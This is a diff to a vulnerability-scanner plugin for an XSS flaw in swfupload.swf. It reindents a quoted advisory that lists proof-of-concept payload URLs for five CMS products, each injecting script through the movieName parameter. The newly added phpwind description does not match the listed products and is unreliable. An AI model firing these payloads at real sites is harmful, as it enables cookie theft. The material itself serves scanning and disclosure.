@@ -15,28 +15,29 @@ class Vuln(ABVuln):
     type = VulnType.XSS  # 漏洞类型
     disclosure_date = '2014-12-11'  # 漏洞公布时间
     desc = '''
-    XSS (WASC-08):
-    Dotclear:
-    http://site/inc/swf/swfupload.swf?movieName=%22]);}catch(e){}if(!self.a)self.a=!alert(document.cookie);//
-    XenForo:
-    http://site/js/swfupload/Flash/swfupload.swf?movieName=%22]);}catch(e){}if(!self.a)self.a=!alert(document.cookie);//
-    InstantCMS:
-    http://site/includes/swfupload/swfupload.swf?movieName=%22]);}catch(e){}if(!self.a)self.a=!alert(document.cookie);//
-    AionWeb:
-    http://site/engine/classes/swfupload/swfupload.swf?movieName=%22]);}catch(e){}if(!self.a)self.a=!alert(document.cookie);//
-    Dolphin:
-    http://site/plugins/swfupload/swf/swfupload.swf?movieName=%22]);}catch(e){}if(!self.a)self.a=!alert(document.cookie);//
+        phpwind（简称：pw）是一个基于PHP和MySQL的开源社区程序，是国内最受欢迎的通用型论坛程序之一。
+        XSS (WASC-08):
+        Dotclear:
+        http://site/inc/swf/swfupload.swf?movieName=%22]);}catch(e){}if(!self.a)self.a=!alert(document.cookie);//
+        XenForo:
+        http://site/js/swfupload/Flash/swfupload.swf?movieName=%22]);}catch(e){}if(!self.a)self.a=!alert(document.cookie);//
+        InstantCMS:
+        http://site/includes/swfupload/swfupload.swf?movieName=%22]);}catch(e){}if(!self.a)self.a=!alert(document.cookie);//
+        AionWeb:
+        http://site/engine/classes/swfupload/swfupload.swf?movieName=%22]);}catch(e){}if(!self.a)self.a=!alert(document.cookie);//
+        Dolphin:
+        http://site/plugins/swfupload/swf/swfupload.swf?movieName=%22]);}catch(e){}if(!self.a)self.a=!alert(document.cookie);//
 
-    Swfupload is used in WordPress, plugins for WP and in other web
-    applications. There are many web applications with it, not as many as those
-    which are using JW Player (http://securityvulns.com/docs28176.html) and JW
-    Player Pro (http://securityvulns.com/docs28483.html) (vulnerabilities in
-    them I've disclosed earlier), but still a lot of.
-    Best wishes & regards,
-    MustLive
-    Administrator of Websecurity web site
-    http://websecurity.com.ua
-    http://packetstormsecurity.com/files/118059/SWF-Upload-Cross-Site-Scripting.html.
+        Swfupload is used in WordPress, plugins for WP and in other web
+        applications. There are many web applications with it, not as many as those
+        which are using JW Player (http://securityvulns.com/docs28176.html) and JW
+        Player Pro (http://securityvulns.com/docs28483.html) (vulnerabilities in
+        them I've disclosed earlier), but still a lot of.
+        Best wishes & regards,
+        MustLive
+        Administrator of Websecurity web site
+        http://websecurity.com.ua
+        http://packetstormsecurity.com/files/118059/SWF-Upload-Cross-Site-Scripting.html.
     '''  # 漏洞描述
     ref = 'Unknown'  # 漏洞来源http://wooyun.org/bugs/wooyun-2013-017731
     cnvd_id = 'Unknown'  # cnvd漏洞编号
